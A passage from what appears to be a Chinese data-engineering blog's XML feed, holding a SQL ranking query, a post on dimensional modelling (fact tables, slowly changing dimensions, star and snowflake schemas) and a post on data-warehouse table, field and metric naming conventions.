*,<span class="hljs-keyword">DENSE_RANK</span>() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> g_sum <span class="hljs-keyword">DESC</span>) rs <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">SUM</span>(g) <span class="hljs-keyword">AS</span> g_sum    <span class="hljs-keyword">FROM</span>  a    <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id) b</code></pre></div></blockquote></li><li><p>表连接</p><p>最后user_id这些换成name，所以需要做表连接；并且WHERE条件过滤掉 rs = 1以外的数据</p><blockquote><p>– 表连接</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,<span class="hljs-keyword">name</span>,g_sum <span class="hljs-keyword">FROM</span>  c<span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">user</span><span class="hljs-keyword">ON</span> user.id = c.user_id<span class="hljs-keyword">WHERE</span> c.rs = <span class="hljs-number">1</span></code></pre></div></blockquote></li></ol><p>完整SQL语句如下：</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">id</span>,<span class="hljs-keyword">name</span>,g_sum <span class="hljs-keyword">FROM</span> (    <span class="hljs-keyword">SELECT</span> *,<span class="hljs-keyword">DENSE_RANK</span>() <span class="hljs-keyword">OVER</span>(<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> g_sum <span class="hljs-keyword">DESC</span>) rs     <span class="hljs-keyword">FROM</span> (        <span class="hljs-keyword">SELECT</span> user_id,<span class="hljs-keyword">SUM</span>(g) <span class="hljs-keyword">AS</span> g_sum        <span class="hljs-keyword">FROM</span> (        <span class="hljs-keyword">SELECT</span> user_id,grade_num <span class="hljs-keyword">AS</span> g <span class="hljs-keyword">FROM</span> grade_info        <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">'add'</span>        <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span>        <span class="hljs-keyword">SELECT</span> user_id,(-grade_num) <span class="hljs-keyword">AS</span> g <span class="hljs-keyword">FROM</span> grade_info        <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">type</span> = <span class="hljs-string">'reduce'</span>        ) a        <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> user_id    ) b    ) c<span class="hljs-keyword">JOIN</span> <span class="hljs-keyword">user</span><span class="hljs-keyword">ON</span> user.id = c.user_id<span class="hljs-keyword">WHERE</span> c.rs = <span class="hljs-number">1</span></code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>维度建模</title>
      <link href="/2021/08/02/%E7%BB%B4%E5%BA%A6%E5%BB%BA%E6%A8%A1/"/>
      <url>/2021/08/02/%E7%BB%B4%E5%BA%A6%E5%BB%BA%E6%A8%A1/</url>
      
        <content type="html"><![CDATA[<p>数仓模型里最常见的建模方法：维度建模</p><a id="more"></a><h2 id="数据模型相关概念"><a href="#数据模型相关概念" class="headerlink" title="数据模型相关概念"></a>数据模型相关概念</h2><p><strong>01. 基本概念</strong></p><p>维度建模，是数据仓库大师Ralph Kimball提出的，是数据仓库工程领域最流行的数仓建模经典。</p><p>维度建模以分析决策的需求出发构建模型，构建的数据模型为分析需求服务，因此它重点解决用户如何更快速完成分析需求，同时还有较好的大规模复杂查询的响应性能。它是面向分析的，为了提高查询性能可以增加数据冗余，反规范化的设计技术。</p><p>数据模型是指用数据来表达分析、决策的模型，而建立数据模型的方法有很多，维度建模就是众多方法的其中之一。</p><p><strong>1.1 事实表</strong></p><p>事实表产生于业务过程，存储了业务活动或事件提炼出来的性能度量。从最低的粒度级别来看，事实表行对应一个度量事件。</p><p>事实表根据粒度的角色划分不同，可分为事务事实表、周期快照事实表、累积快照事实表。</p><p>（1）<strong>事务事实表</strong>，用于承载事务数据，通常粒度比较低，它是面向事务的，其粒度是每一行对应一个事务，它是最细粒度的事实表，例如产品交易事务事实、ATM交易事务事实。</p><p>（2）<strong>周期快照事实表</strong>，按照一定的时间周期间隔(每天，每月)来捕捉业务活动的执行情况，一旦装入事实表就不会再去更新，它是事务事实表的补充。用来记录有规律的、固定时间间隔的业务累计数据，通常粒度比较高，例如账户月平均余额事实表。</p><p>（3）<strong>累积快照事实表</strong>，用来记录具有时间跨度的业务处理过程的整个过程的信息，每个生命周期一行，通常这类事实表比较少见。</p><p><em>注意：**这里需要值得注意的是，在事实表的设计时，一定要注意一个事实表只能有一个粒度，不能将不同粒度的事实建立在同一张事实表中。</em></p><p><strong>1.2 维度表</strong>  </p><p>维度表，一致性维度，业务过程的发生或分析角度，我们主要关注下退化维度和缓慢变化维。</p><p>（1）<strong>退化维度</strong>（DegenerateDimension）</p><p>在维度类型中，有一种重要的维度称作为退化维度，亦维度退化一说。这种维度指的是直接把一些简单的维度放在事实表中。退化维度是维度建模领域中的一个非常重要的概念，它对理解维度建模有着非常重要的作用，退化维度一般在分析中可以用来做分组使用。</p><p>（2）<strong>缓慢变化维</strong>（Slowly Changing Dimensions）</p><p>维度的属性并不是始终不变的，它会随着时间的流逝发生缓慢的变化，这种随时间发生变化的维度我们一般称之为缓慢变化维（SCD）。</p><p>SCD常用的三种处理方式：</p><p>① <strong>TYPE1</strong> 直接覆盖原值</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210815050950.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>② <strong>TYPE2</strong> 增加维度行</p><p>   <em>在为维度成员增加新行时，需为其分配新的主代理键。<strong>并且，至少需要在维度行再增加三列：</strong>有效日期、截止日期、行标识。**这个地方可联想拉链表设计。</em></p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210815051025.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>③ <strong>TYPE3</strong> 增加属性列 </p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210815051109.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>④ 混合方式</p><p>可根据实际业务场景，混合或选择使用以上三种方式，以快速方便而又准确的分析历史变化情况。</p><p><strong>1.3 粒度</strong></p><p>用于确定某一事实表中的行表示什么，是业务最小活动单元或不同维度组合，即业务细节程度。</p><p><strong>1.4 维度建模流程</strong></p><p>维度建模步骤：选择业务过程-&gt;声明粒度-&gt;确定维度-&gt;确定事实。旨在重点解决数据粒度、维度设计和事实表设计问题。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210815051204.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>声明粒度，为业务最小活动单元或不同维度组合。以共同粒度从多个组织业务过程合并度量的事实表称为合并事实表，需要注意的是，来自多个业务过程的事实合并到合并事实表时，它们必须具有同样等级的粒度。</p><p>以上四个步骤是维度建模的所有步骤，仅仅确定模型中的事实表和维度表。</p><p>而数据整个流向具体步骤如下：</p><ul><li>将详细的原子数据加载到维度结构中</li><li>围绕业务流程构建维度模型</li><li>确保每个事实表都有一个关联的日期维度表</li><li>确保单个事实表中的所有事实具有相同的粒度或详细程度</li><li>解析事实表中的多对多关系</li><li>解析维度表中的多对一关系</li><li>在维度表中存储报表标签和筛选值</li><li>确保维度表使用代理键</li><li>创建一致的维度以在整个企业中集成数据</li><li>提供DW/BI解决方案</li><li>支持业务用户的决策</li></ul><p>数据仓库建模方法论可分为：<strong>维度建模</strong>、范式建模、Data Vault模型、Anchor模型</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210801225303.png" srcset="/img/loading.gif" lazyload="" width="50%"></p><p>其中数仓最为常用的是<strong>维度建模</strong>，而维度建模建立的模型主要有三种：（1）<strong>星型模型</strong>、（2）<strong>雪花模型</strong>、（3）<strong>星座模型</strong></p><h2 id="维度建模的三种数据模型"><a href="#维度建模的三种数据模型" class="headerlink" title="维度建模的三种数据模型"></a>维度建模的三种数据模型</h2><h3 id="星型模型"><a href="#星型模型" class="headerlink" title="星型模型"></a>星型模型</h3><p>星型模型主要由维表和事实表构成，<strong>以事实表为中心</strong>，所有维度直接关联在事实表上，呈星型分布。</p><p><img src="C:%5CUsers%5CCAIWEI%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210815051258507.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>图来源于Kimball《The Data Warehouse Toolkits -3rd Edition》</p><h3 id="雪花模型"><a href="#雪花模型" class="headerlink" title="雪花模型"></a>雪花模型</h3><p>雪花模型，在星型模型的基础上，维度表上又关联了其他维度表。</p><p>雪花模型的维护成本较高，性能方面也较差，尤其是基于hadoop体系构建数仓，减少join就是减少shuffle，性能差距会很大。</p><ul><li><p><strong>区分星型模型与雪花模型</strong></p><p>与星型模型的区别：主要在维度，标准的星型模型维度只有一层，而雪花模型的维度会涉及多级，如图：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210801230325.png" srcset="/img/loading.gif" lazyload="" alt="星型模型与雪花模型"></p><ul><li><strong>星型模型和雪花模型的优劣对比</strong></li></ul><table><thead><tr><th align="left">属性</th><th align="left">星型模型</th><th align="left">雪花模型</th></tr></thead><tbody><tr><td align="left">数据总量</td><td align="left">多</td><td align="left">少</td></tr><tr><td align="left">可读性</td><td align="left">容易</td><td align="left">差</td></tr><tr><td align="left">表个数</td><td align="left">少</td><td align="left">多</td></tr><tr><td align="left">查询速度</td><td align="left">快</td><td align="left">慢</td></tr><tr><td align="left">冗余度</td><td align="left">高</td><td align="left">低</td></tr><tr><td align="left">对实时表的情况</td><td align="left">增加宽度</td><td align="left">字段比较少，冗余底</td></tr><tr><td align="left">扩展性</td><td align="left">差</td><td align="left">好</td></tr></tbody></table><ul><li><p>应用场景</p><p><strong>星型模型</strong>的设计方式主要带来的好处是能够提升查询效率，因为生成的事实表已经经过预处理，主要的数据都在事实表里面，所以只要扫描实时表就能够进行大量的查询，而不必进行大量的join，其次维表数据一般比较少，在join可直接放入内存进行join以提升效率，除此之外，星型模型的事实表可读性比较好，不用关联多个表就能获取大部分核心信息，设计维护相对比较简答。</p><p><strong>雪花模型</strong>的设计方式是比较符合数据库范式（比较靠近3NF，但无法完全遵守，因为完全遵循3NF的性能成本太高）的理念，设计方式比较正规，数据冗余少，但在查询的时候可能需要join多张表从而导致查询效率下降，此外规范化操作在后期维护比较复杂。</p></li></ul><h3 id="星座模型"><a href="#星座模型" class="headerlink" title="星座模型"></a>星座模型</h3><p>星座模型，是对星型模型的扩展延伸，多张事实表共享维度表。数仓模型建设后期，大部分维度建模都是星座模型。</p><p>星座模型与前两种的区别是<strong>事实表的数量</strong>，星座模型有多个事实表。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210801234858.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h2 id="模型选择"><a href="#模型选择" class="headerlink" title="模型选择"></a>模型选择</h2><ul><li><p>星座不星座？</p><p>这个只跟数据和需求有关系，跟设计没关系，不用选择。</p><p>（需要星座模型的时候就得是星座模型，不需要的时候就不会是星座模型，所以不用选）</p></li><li><p>星型还是雪花？</p><p>取决于<strong>性能优先</strong>还是<strong>灵活优先</strong></p><p>如果性能优先，则选择星型模型；如果灵活优先则选择雪花模型。</p><p>在实际开发中，不会只选择一种，会根据情况组合甚至并存（一层维度和多层维度都保留）。但整体来看会更倾向于<strong>星型模型</strong>，尤其是Hadoop体系中，减少Join操作可减少Shuffle，性能差距很大（关系型库数据可以依靠强大的主键索引）。</p></li></ul><p>总结：</p><p>数据仓库大多数时候是比较适合使用<strong>星型模型构建底层数据Hive表</strong>，通过大量的冗余来提升查询效率，星型模型对OLAP的分析引擎支持比较友好，这一点在Kylin中比较能体现。而雪花模型在关系型数据库中如MySQL，Oracle中非常常见，尤其像电商的数据库表。在数据仓库中雪花模型的应用场景比较少，但也不是没有，所以在具体设计的时候，可以考虑是不是能结合两者的优点参与设计，以此达到设计的最优化目的。</p><h2 id="事实表的维度建模"><a href="#事实表的维度建模" class="headerlink" title="事实表的维度建模"></a>事实表的维度建模</h2><p>维度建模的中心是事实表（星型模型、雪花模型、星座模型都是以<strong>事实表</strong>为中心）,因而事实表是维度建模的核心表和基本表。它存储了业务过程中的各种度量和事实，而这些度量和事实正是下游数据使用人员所要关心和分析的对象。</p><p>接下来将探讨以下三种事实表：</p><ul><li>事务事实表</li><li>快照事实表</li><li>累计快照事实表</li></ul><h3 id="事务事实表"><a href="#事务事实表" class="headerlink" title="事务事实表"></a>事务事实表</h3><p>事务事实表是维度建模事实表中最为常见、使用最为广泛的事实表。</p><p>事务事实表通常用于记录业务过程的事件，而且是原子粒度的事件。事务事实表中的数据在事务事件发生之后，数据的粒度通常是每个事务一条记录。一旦事务被提交，事实表数据被插入，数据就不再进行更改。</p><p>我们通过事务事实表存储单次业务事件 / 行为的细节，以及存储与事件相关的维度细节，用户即可以单独或者聚合分析业务事件和行为。</p><p>事务事实表的粒度确定是事务事实表设计过程中的关键步骤，一般都会包含可加的度量和事实。理解概念的最佳途径无疑是实际的例子，因此下面将结合超市零售业务以及维度建模的四个环节来说明事务事实表。</p><p><strong>（1）选择业务过程</strong></p><p>在超市的零售示例中，业务用户做的事情是更好的理解POS系统记录顾客购买的情况，那么很容易确定业务过程就是POS系统记录的顾客购买情况，即在什么时候、什么商品、哪个收银台、销售了哪些产品等。</p><p><strong>（2）定义粒度</strong></p><p>顾客单次购买行为的体现是一张购物小票，但是事务事实表应该选择最原子粒度的事件，所以小票的子项（在业务上的动作即为收银员每次扫描的商品条码）应该是超市零售事务事实表的粒度。</p><p><strong>（3）确定维度</strong></p><p>小票子项的粒度确定后，销售日期、销售商品、销售收银台、销售门店等维度很容易被确定了。另一个不太容易考虑到的是维度是促销行为，但是通过和业务人员交流或者查看报表表头等也能够发现此维度。</p><p><strong>（4）确定事实</strong></p><p>维度设计的最后一步，是确定哪些事实和度量应该在事实表中出现。对于本例，商品销售数量、销售价格和销售金额很容易确定下来。但是实际上，商品的成本价是确定的，因此可以很容易地确定商品的销售毛利：（商品实际销售价格－商品成本价） 销售数量，基于下游使用便利这一因素，也应该将此放人事务事实表中。</p><p>基于毛利润也可以计算出毛利率，那么毛利率这种比例应该放入事务事实表吗？在事实表的设计中，一个常见的原则是只存放比例的分子和分母，因此比例的计算是和业务强，业务逻辑可能非常的复杂，所以一般不加入事实表中。</p><p>至此，我们也完成了超市零售事务的事实表和维度表的设计，超市零售事务事实表以及相关的维度表如图所示：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/zWSuIP8rdu1xpCsHSKOlS1xSo5WWsufMriaqfAVNwTl564heVN3dTOV7F4huibx5YKlrRqHWaZScjoXiakZscZuGw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="快照事实表"><a href="#快照事实表" class="headerlink" title="快照事实表"></a>快照事实表</h3><p>在实际的业务活动中，除了关心单次的业务事件和行为外，很多时候还关心业务的状态（当前状态、历史状态）。以超市零售业务为例，管理人员和分析人员除了关心销售情况，还会关心商品的库存情况，例如哪些商品的库存情况，例如哪些商品库存告罄需要补货、哪些积压需要促销，而这正是 <strong>快照事实表（也叫周期快照事实表）</strong>所要解决发范畴。</p><p>所谓周期快照事实表，是指间隔一定的周期对业务的状态进行一次拍照并记录下来的事实表。最常见的例子是销售库存、银行账户余额等。</p><p>与事务事实表的稀疏性不同（这里的稀疏性是相对的），周期快照事实表通常被认为是稠密的。因此事务事实表只有事务发生才会记录，但是周期快照则必须捕获当前每个实体的状态。</p><p>比如，某个商品如果某天没有销售，那么这个商品不会存在于当天的事务事实表中的，但是为了记录其库存情况，即使没有销售行为，也必须再周期快照事实表中对其进行拍照。</p><p>周期快照事实表的周期通常需要和业务方共同确定，最常见的周期是天、周和月等。</p><p>周期快照事实表中的事实一般是半可加的，如某个商品的库存可以跨商品、仓库等相加，但是明显在时间上相加是没有意义的。</p><p>下面就以超市的库存业务为例来介绍周期快照事实表的设计过程。</p><p><strong>（1）选择业务过程</strong></p><p>本例是为了更好地理解超市的库存情况，因此业务过程就是商品的库存情况，即在什么时候、什么商品、哪个仓库的库存量如何。</p><p><strong>（2）定义粒度</strong></p><p>这里的粒度主要指库存的周期，商品的粒度很容易确定（注意这里是 SKU 级别）。选择库存的周期需要考虑到数据量膨胀情况。</p><p>考虑如下例子，某个超市有 万个商品（即SKU）， 其有 100 家连锁店，那么每天对其库存拍照将有 100<em>10000=100 万行记录，那么一年将有 365</em>1000000=3.65亿条记录。当然随着目前存储的日益廉价，这些都不是问题，但是设计人员需要考虑到这些因素。</p><p><strong>（3）确认维度</strong></p><p>对于超市零售库存，相应的维度为周期（天 周、月等） 商品、仓库（总仓、分仓或者门店等）。</p><p><strong>（4）确定事实</strong></p><p>这里的事实很容易确定，即库存量。但是仅仅记录现存库存是不够充分的，因为业务上通常会和其他事实协同来度量库存的变化趋势、快慢等，所以还可对周期快照事实表的事实进行增强 。</p><p>基于上述设计的周期快照事实表及相关维度如图所示：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/zWSuIP8rdu1xpCsHSKOlS1xSo5WWsufMadt0wGdd7IGAib4NT8SuUMC4fggBpjbBMRZnVgw4kK8e6KMOCr9uK5Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" srcset="/img/loading.gif" lazyload="" alt=""></p><h3 id="累计快照事实表"><a href="#累计快照事实表" class="headerlink" title="累计快照事实表"></a>累计快照事实表</h3><p>事实表的第三种类型是累计快照事实表，相比前两者，累计快照事实表没那么常见，但是对于某些业务场景来说非常有价值。</p><p><strong>累计快照事实表非常适用于具有工作流或者流水线形式业务的分**</strong>析**，这些业务通常涉及多个时间节点或者有主要的里程碑事件，而累计快照事实表正是从全流程角度对其业务状态的拍照。</p><p>考虑车险理赔业务，一次车险的理赔通常包括客户报案、保险公司立案、客户提交理赔材料、理赔审批通过和付款等关键步骤，而累积快照事实表正是从全流程角度对每个车险理赔单的拍照，拍照内容即是其关键步骤的各个状态，便于业务人员一目了然地分析各个理赔单的状态、步骤间的耗时等。</p><p>下面以车险理赔业务为例来介绍累计周期快照事实表。</p><p><strong>（1）选择业务过程</strong></p><p>本例是为了更好地理解保险公司的车险理赔业务，因此业务过程就是车险理赔，即在什么时候、 哪个理赔申请所处的状态如何。</p><p><strong>（2）定义粒度</strong></p><p>累计周期快照事实表的粒度一般很容易确定，就是业务的某个实体，这里即为保险理赔申请。</p><p><strong>（3）确定维度</strong></p><p>对于累计周期快照事实表，相关的维度包含快照周期（天、周、月 和年等）、理赔申请人、受理 、审核人、网点 电话或者实体）等。</p><p><strong>（4）确定事实</strong></p><p>这里的事实包括索赔金额、审批金额、打款金额、处理时长等。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/zWSuIP8rdu1xpCsHSKOlS1xSo5WWsufMzATAjpktT6dZD89zaX1GZ9sryv7uaTQ4RIhULj4DX12RXbuTetudAA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" srcset="/img/loading.gif" lazyload="" alt=""></p><h2 id="维度建模其他概念"><a href="#维度建模其他概念" class="headerlink" title="维度建模其他概念"></a>维度建模其他概念</h2><h3 id="1-角色扮演维度"><a href="#1-角色扮演维度" class="headerlink" title="1 角色扮演维度"></a>1 角色扮演维度</h3><p> 单个维度可以被事实表多次引用，每个引用连接逻辑上存在差异的角色维度。例如，事实表可以有多个日期，每个日期通过外键引用不同的日期维度，原则上每个外键表示不同的日期维度视图，这样引用具有不同的含义。这些不同的维度视图具有唯一的代理键列名,被称为角色，相关维度被称为<strong>角色扮演维度</strong>。</p><p>当一个事实表多次引用一个维度表时会用到角色扮演维度。例如，一个销售订单有一个是订单日期，还有一个请求交付日期，这时就需要引用日期维度表两次。</p><p>我们期望在每个事实表中设置日期维度，因为总是希望按照时间来分析业务情况。在事务型事实表中，主要的日期列是事务日期，例如，订单日期。有时会发现其它日期也可能与每个事实关联，例如，订单事务的请求交付日期。每个日期应该成为事实表的外键。</p><p><a href="https://cloud.tencent.com/developer/article/1012222" target="_blank" rel="noopener">HAWQ取代传统数仓实践（八）——维度表技术之角色扮演维度</a></p><h3 id="2-多对多关系和双向筛选器"><a href="#2-多对多关系和双向筛选器" class="headerlink" title="2 多对多关系和双向筛选器"></a>2 多对多关系和双向筛选器</h3><p>许多数据建模决策是性能和功能之间的权衡；使用迭代设计，你通常会找到解决问题的更好方法。有几种不同的方法可以设计多对多关系。传统的方法是使用桥接表，该桥接表包含将两个表关联在一起的所有键组合。在下面的示例中，“客户”和“产品”维度表通常有一个从关系的“一方”到“多方”的单向过滤器。如果要求根据购买产品的选定客户筛选产品，我们可以使用“销售”事实表作为桥接表，并将产品和销售之间的关系更改为使用双向筛选器。</p><p>根据关系的基数，使用双向过滤器可能会导致性能损失。如果我们只有100种产品，销售记录不到100万，这可能不是什么大事。如果我们有1万种产品和1亿份销售记录，这种关系可能会大大减慢速度(“除非必须这样做，否则不要这样做”)。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20210802010318.png" srcset="/img/loading.gif" lazyload="" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据仓库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数仓入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数仓命名规范</title>
      <link href="/2021/08/02/%E6%95%B0%E4%BB%93%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/"/>
      <url>/2021/08/02/%E6%95%B0%E4%BB%93%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/</url>
      
        <content type="html"><![CDATA[<p>数据仓库命名规范</p><a id="more"></a><p>这里分为<strong>表命名规范</strong>、<strong>字段命名规范</strong>、<strong>指标命名规范</strong>、<strong>作业命名规范</strong>，通常涉及表命名规范</p><h2 id="表命名规范"><a href="#表命名规范" class="headerlink" title="表命名规范"></a>表命名规范</h2><p>不同分层的表命名规范不一样（以下命名规范包括了库名），abc为补充的三个参数，具体见后面</p><ul><li><p>ODS层</p><p>即贴源层，由业务方直接导入，不会经过数据清洗转化。操作数据层定位于业务明细数据保留区，负责保留数据接入时点后历史变更数据，数据原则上全量保留。</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml">项目名<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_ods</span>.</span></span>ods_系统名称(默认为空)_源表名_abc</code></pre></div></li><li><p>DW层</p><p>由ODS层数据经过清洗转化而成。这一层整合后的业务过程明细数据，负责各业务场景整合、数据结构化、规范化，常用公共维度冗余加工，以及明细业务标签信息加工。另外，在该层也会做一部分的数据聚合，将相同主题的数据汇集到一张表中，提高数据的可用性。</p><ul><li><p>dim层（维表）</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml">项目名<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_dw</span>.</span></span>dim_项目名_业务描述_abc</code></pre></div></li><li><p>dwv（业务明细）</p><div class="hljs code-wrapper"><pre><code class="hljs haxe">项目名_dw.dwv_项目名<span class="hljs-literal">_</span>一级主题域<span class="hljs-literal">_</span>二级主题域<span class="hljs-literal">_</span>业务描述_abc</code></pre></div></li><li><p>dwm（周期汇总）</p><div class="hljs code-wrapper"><pre><code class="hljs haxe">项目名_dw.dws_项目名<span class="hljs-literal">_</span>数据粒度<span class="hljs-literal">_</span>业务描述<span class="hljs-literal">_</span>统计范围cycle[N]_abc</code></pre></div><p>例如：</p><p><code>projectname_dw.dwm_projectname_store_activity_byr_currcy_order_cycle7_sdt</code>说明：projectname是项目名，其数据粒度为店铺（store）+活动（activity）+买家（byr）+币种（currcy）;业务描述为下单（order）；统计的时间范围为近7天。</p></li><li><p>dws层（数据汇总服务）</p><div class="hljs code-wrapper"><pre><code class="hljs haxe">项目名_dw.dws_项目名<span class="hljs-literal">_</span>数据粒度<span class="hljs-literal">_</span>业务描述_abc</code></pre></div></li></ul></li></ul><blockquote><p><strong>abc 说明</strong></p><p>a：表示数据粒度类别: <strong>f</strong> 表示明细数据，<strong>s</strong>表示汇总数据。</p><p>b：表示数据更新周期: <strong>d</strong>表示天(t+1)产出; <strong>h</strong>表示小时产出; <strong>mi</strong>表示分钟产出; <strong>c</strong>表示全量产出; <strong>w</strong>表示周产出; <strong>m</strong>表示月产出，<strong>y</strong>表示月产出。</p><p>c：表示数据存储形态: <strong>t</strong>表示表; <strong>v</strong>表示视图。</p><p>abc会有多种不同的组合，比如 fct 表示dw层的全量表，fdt 表示dw层的增量表(天表)</p></blockquote><ul><li><p>作业命名规范</p><ul><li><p>数据采集作业（后缀import）</p><p>一般是采集变成ods层数据</p><div class="hljs code-wrapper"><pre><code class="hljs elm">项目名_ods.ods_系统名称_源表名_abc_<span class="hljs-keyword">import</span></code></pre></div><p>如：projectname_ods.ods_projectname_orders_fct_import</p></li><li><p>数据导出作业（后缀export）</p><p>同采集作业，但后缀改成export</p><p>projectname_store_method_h_export </p></li><li><p>数据查询作业</p><p>与产出目标表同名</p></li></ul></li></ul><h2 id="字段命名规范"><a href="#字段命名规范" class="headerlink" title="字段命名规范"></a>字段命名规范</h2><ul><li><p>度量词汇</p><p>次数：cnt</p><p>金额：amt</p><p>时长：dr</p><p>比例：rate</p><p>百分比：pct</p><p>环比：p2p</p></li></ul><ul><li><p>统计词汇</p><p>订单金额：order_amt</p><p>商品数：prod_cnt</p><p>用户数：uid_cnt</p><p>订单数：order_cnt</p><p>曝光次数：pv</p><p>点击次数：click_cnt</p><p>买家数：byr_cnt</p><p>卖家数：sel_cnt</p><p>店铺数：store_cnt</p></li></ul><ul><li><p>约定名词词汇</p><p>gmv：成交金额</p><p>cmv：取消金额</p><p>pmv：营业额</p><p>cancel：取消</p><p>consumer：顾客（有消费记录）</p><p>user：用户</p><p>member：会员</p><p>coins：购物金</p><p>sent：发送</p><p>used：使用</p><p>unuse：待使用/未使用（不含已过期）</p><p>source：来源</p><p>promotion：优惠</p></li></ul><ul><li><p>日期修饰词汇</p><p>日：d</p><p>小时：h</p><p>分钟：mi</p><p>周：w</p><p>月：m</p><p>季度：q</p><p>年：y</p><p>七日：7d</p></li></ul><ul><li><p>聚合词汇</p><p>total：历史累计</p><p>avg：平均</p><p>std：截止到当前统计日期</p></li></ul><ul><li><p>业务场景词汇</p><p>order：下单</p><p>pay：支付</p><p>refund：退款</p><p>return_goods：退货  </p><p>subs：订阅</p><p>reg：注册</p><p>login：登录  </p><p>visit：访问</p><p>add_chart：购物车</p><p>site：站点</p></li></ul><h2 id="指标命名规范"><a href="#指标命名规范" class="headerlink" title="指标命名规范"></a>指标命名规范</h2><p>1、指标统一：数据指标的内容及对应的命名、属性需要保持唯一性，无歧义。</p><p>2、指标统一目前只针对单一业务，暂不考虑跨业务间场景</p><p>3、指标统一命名：修饰语（业务场景限定条件）+对象+方法+时间范围 如cancel_order_cnt_1d</p><p>修饰语（业务场景限定条件）：cancel 取消；</p><p>统计对象：order 订单；</p><p>统计方法：cnt 记数，对订单进行去重统计；</p><p>统计周期：1d近一天的。</p><p>4、原子、派生指标之间的定义和关系</p><p>​    原子指标：基于某一业务事件行为下的度量，是业务定义中不可再拆分的指标，具有明确业务含义的名词 ，如支付金额。</p><p>​    派生指标: 由原子指标＋多个修饰词（可选）＋时间周期。可以理解为对原子指标业务统计范围的圈定。如原子指标：支付金额，最近一天海外买家支付金额则为派生指标（最近一天为时间周期，海外为修饰词 买家作为维度，而不作为修饰词）</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据仓库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数仓入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数仓主题域划分</title>
      <link href="/2021/08/01/%E6%95%B0%E4%BB%93%E4%B8%BB%E9%A2%98%E5%9F%9F%E5%88%92%E5%88%86/"/>
      <url>/2021/08/01/%E6%95%B0%E4%BB%93%E4%B8%BB%E9%A2%98%E5%9F%9F%E5%88%92%E5%88%86/</url>
      
